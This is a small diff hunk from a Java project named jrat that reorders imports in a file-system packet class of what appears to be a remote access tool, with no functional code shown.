@@ -1,8 +1,8 @@
 package jrat.module.fs.packets;
 
+import jrat.client.Connection;
 import jrat.client.packets.incoming.AbstractIncomingPacket;
 import jrat.common.codec.Hex;
-import jrat.client.Connection;
 
 import java.io.File;
 
